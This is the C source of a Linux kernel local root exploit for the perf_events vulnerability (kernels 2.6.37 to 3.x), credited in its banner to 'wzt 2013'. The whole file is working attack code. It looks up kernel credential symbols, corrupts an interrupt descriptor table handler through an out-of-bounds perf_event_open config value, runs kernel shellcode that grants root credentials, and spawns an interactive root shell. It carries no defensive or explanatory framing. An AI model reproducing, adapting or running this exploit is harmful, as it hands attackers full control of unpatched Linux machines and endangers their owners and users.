#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <syscall.h>
#include <stdint.h>
#include <assert.h>
#include <linux/perf_event.h>
 
#define KALLSYMS_NAME "/boot/System.map-2.6.32-279.el6.x86_64"
 
#define BASE 0x380000000
#define SIZE 0x010000000
#define KSIZE 0x2000000
 
#define USER_CS 0x33
#define USER_SS 0x2b
#define USER_FL 0x246
 
#define STACK(x) (x + sizeof(x))
 
typedef int __attribute__((regparm(1)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(1)))(*_prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
 
void exit_user_code(void);
char user_stack[1024 * 1024];
 
uint64_t *orig_idt_handler;
 
unsigned char kern_sc[] = "\x48\xc7\xc3\x40\x08\x40\x00\xff\xe3";
 
struct idtr {
uint16_t limit;
uint64_t addr;
}__attribute__((packed));
 
void exit_user_code(void)
{
if (getuid() != 0) {
printf("[-] exploit failed.\n");
exit(-1);
}
 
printf("[+] Got root shell!\n");
execl("/bin/bash", "sh", "-i", NULL);
}
 
void kernel_shellcode(void)
{
asm volatile("swapgs\n\t"
"movq orig_idt_handler, %rsi\n\t"
"movq $-1, (%rsi)\n\t"
"movq $0, %rdi\n\t"
"movq $prepare_kernel_cred, %rsi\n\t"
"movq (%rsi), %rsi\n\t"
"callq *%rsi\n\t"
"movq %rax, %rdi\n\t"
"movq $commit_creds, %rsi\n\t"
"movq (%rsi), %rsi\n\t"
"callq *%rsi\n\t"
"movq $0x2b, 0x20(%rsp)\n\t"
"movq $user_stack, %rbx\n\t"
"addq $0x100000, %rbx\n\t"
"movq %rbx, 0x18(%rsp)\n\t"
"movq $0x246, 0x10(%rsp)\n\t"
"movq $0x33, 0x08(%rsp)\n\t"
"movq $exit_user_code, %rbx\n\t"
"movq %rbx, 0x00(%rsp)\n\t"
"swapgs\n\t"
"iretq");
}
 
int perf_event_open(uint32_t offset)
{
struct perf_event_attr p_attr;
int fd;
 
memset(&p_attr, 0, sizeof(struct perf_event_attr));
p_attr.type = PERF_TYPE_SOFTWARE;
p_attr.size = sizeof(struct perf_event_attr);
p_attr.config = offset;
p_attr.mmap = 1;
p_attr.freq = 1;
 
fd = syscall(__NR_perf_event_open, &p_attr, 0, -1, -1, 0);
if (fd == -1) {
perror("perf_event_open");
return -1;
}
 
if (close(fd) == -1) {
perror("close");
return -1;
}
 
return 0;
}
 
unsigned long find_symbol_by_proc(char *file_name, char *symbol_name)
{
FILE *s_fp;
char buff[200];
char *p = NULL, *p1 = NULL;
unsigned long addr = 0;
 
s_fp = fopen(file_name, "r");
if (s_fp == NULL) {
printf("open %s failed.\n", file_name);
return 0;
}
 
while (fgets(buff, 200, s_fp) != NULL) {
if (strstr(buff, symbol_name) != NULL) {
buff[strlen(buff) - 1] = '\0';
p = strchr(strchr(buff, ' ') + 1, ' ');
++p;
if (!p)
return 0;
 
if (!strcmp(p, symbol_name)) {
p1 = strchr(buff, ' ');
*p1 = '\0';
sscanf(buff, "%lx", &addr);
break;
}
}
}
 
fclose(s_fp);
return addr;
}
 
int perf_symbol_init(void)
{
struct utsname os_ver;
char system_map[128];
 
if (uname(&os_ver) == -1) {
perror("uname");
return -1;
}
 
printf("[+] target kernel: %s\tarch: %s\n", os_ver.release, os_ver.machine);
 
snprintf(system_map, sizeof(system_map),
"/boot/System.map-%s", os_ver.release);
printf("[+] looking for symbols...\n");
commit_creds = (_commit_creds)find_symbol_by_proc(system_map, "commit_creds");
if (!commit_creds) {
printf("[-] not found commit_creds addr.\n");
return -1;
}
printf("[+] found commit_creds addr: %p\n", commit_creds);
 
prepare_kernel_cred =(_prepare_kernel_cred)find_symbol_by_proc(system_map,
"prepare_kernel_cred");
if (!prepare_kernel_cred) {
printf("[-] not found prepare_kernel_cred addr.\n");
return -1;
}
printf("[+] found prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
}
 
void exploit_banner(void)
{
printf("Linux kernel perf_events(2.6.37 - 3.x) local root exploit.\n"
"by wzt 2013\thttp://www.cloud-sec.org\n\n");
}
 
int main()
{
struct idtr idt;
uint64_t kbase;
uint8_t *code;
uint32_t *map;
int i;
int idt_offset;
 
exploit_banner();
 
if (perf_symbol_init() == -1)
return -1;
 
map = mmap((void*)BASE, SIZE, PROT_READ | PROT_WRITE,
MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
if (map != (void *)BASE) {
perror("mmap");
return -1;
}
printf("[+] mmap at %p ok.\n", (void *)map);
memset(map, 0, SIZE);
 
if (perf_event_open(-1) == -1)
return -1;
 
if (perf_event_open(-2) == -1)
return -1;
 
for (i = 0; i < SIZE/4; i++) {
if (map[i]) {
assert(map[i+1]);
break;
}
}
assert(i<SIZE/4);
 
asm ("sidt %0" : "=m"(idt));
kbase = idt.addr & 0xff000000;
 
code = mmap((void*)kbase, KSIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
if (code != (void *)kbase) {
perror("mmap");
return -1;
}
printf("[+] mmap shellcode at %p ok.\n", (void *)code);
 
memset(code, 0x90, KSIZE);
code += KSIZE - 1024;
 
*(uint32_t *)(kern_sc + 3) = (uint32_t)&kernel_shellcode;
memcpy(code - 9, kern_sc, 9);
 
orig_idt_handler = (uint64_t *)(idt.addr + 0x48);
printf("[+] int4 idt handler addr: %lx\n", orig_idt_handler);
 
idt_offset = -i + (((idt.addr & 0xffffffff) - 0x80000000) / 4) + 16;
printf("[+] trigger offset: %d\n", idt_offset);
 
if (perf_event_open(idt_offset) == -1)
return -1;
 
printf("[+] trigger int4 ...\n");
asm("int $0x4");
}